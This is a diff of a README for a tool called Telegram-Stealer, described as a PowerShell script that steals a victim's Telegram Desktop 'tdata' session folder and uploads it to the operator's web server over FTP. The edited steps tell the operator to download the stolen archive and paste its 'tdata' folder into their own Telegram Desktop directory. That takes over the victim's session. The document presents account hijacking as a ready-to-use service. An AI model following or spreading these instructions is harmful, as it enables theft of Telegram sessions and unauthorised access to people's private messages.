@@ -11,7 +11,7 @@
 
 ---
 * **If you like the tool and for my personal motivation so as to develop other tools please  leave a +1 star** 
-### --> Powershell script to steal telegram `tdata` and upload file to webserver using `ftp` <--
+### --> Powershell script to steal telegram `tdata`  and upload file to webserver using `ftp` <--
 
 ### Usage :
 * Open cmd prompt  and Run  `run.bat`  
@@ -27,9 +27,10 @@
 ---
 ### Telegram-Stealer in Action:
 
-* After the `tdata` file is uploaded to your webserver. 
-* Download the zip file and extract in your pc. Now copy `tdata` folder and paste on this directory *C:\Users\your_username\AppData\Roaming\Telegram Desktop*
-* Makesure both victim & you have installed `telegram desktop application` in your pc and before pasting `tdata` make sure you have deleted `tdata` folder  on your pc 
+* After the `tdata` file is uploaded to your web server, download the zip file and extract it on your PC. 
+* Now, copy the `tdata` folder and paste it in the directory: *C:\Users\your_username\AppData\Roaming\Telegram Desktop*. 
+* Before pasting the `tdata` folder, ensure that you have deleted the existing `tdata` folder on your PC.
+
 
 ## Contact :
 <a href=mailto:swagkarna@gmail.com><img src="https://img.shields.io/badge/Gmail-swagkarna-green?style=for-the-badge" /></a>
